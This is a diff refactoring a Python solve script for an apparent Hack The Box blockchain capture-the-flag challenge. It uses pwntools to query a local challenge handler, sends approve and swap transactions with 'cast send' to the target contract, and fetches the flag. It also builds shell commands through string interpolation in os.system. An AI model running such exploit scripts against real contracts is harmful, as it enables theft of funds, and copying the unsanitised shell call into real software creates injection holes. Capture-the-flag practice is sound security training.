@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 from os import system
-from requests import get
-import sys
-import pwn
+from pwn import remote
 
 def csend(contract: str, fn: str, *args):
     global rpc_url
@@ -12,20 +10,19 @@ def csend(contract: str, fn: str, *args):
         f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}"
     )
 
+HANDLER_PORT = 8001
 
 if __name__ == "__main__":
-    challHandler = ("0.0.0.0", 8001)
-    if len(sys.argv) > 2:
-        baseUrl = sys.argv[1]
+    challHandler = ("0.0.0.0", HANDLER_PORT)
+    connection_info = {}
 
     # connect to challenge handler and get connection info
-    p = pwn.remote("0.0.0.0", 8001)
-    p.recvuntil(b"action? ")
-    p.sendline(b"1")
-    p.recvuntil(b"Here's your connection info:\n\n")
-    connection_info = {}
-    data = p.recvall()
-    p.close()
+    with remote("0.0.0.0", HANDLER_PORT) as p:
+        p.recvuntil(b"action? ")
+        p.sendline(b"1")
+        p.recvuntil(b"Here's your connection info:\n\n")
+        data = p.recvall()
+
     lines = data.decode().split('\n')
     for line in lines:
         if line:
@@ -45,9 +42,9 @@ if __name__ == "__main__":
     csend(htb_addr, "approve(address,uint256)", target, str(1 * 10**18))
     csend(target, "swap(address,address,uint256)", htb_addr, weth_addr, str(5 * 10**17)) # 0.5 HTB  
 
-    p = pwn.remote("0.0.0.0", 8001)
-    p.recvuntil(b"action? ")
-    p.sendline(b"3")
-    flag = p.recvall().decode()
-    p.close()
+    with remote("0.0.0.0", HANDLER_PORT) as p:
+        p.recvuntil(b"action? ")
+        p.sendline(b"3")
+        flag = p.recvall().decode()
+        
     print(f"\n\n[*] {flag}")
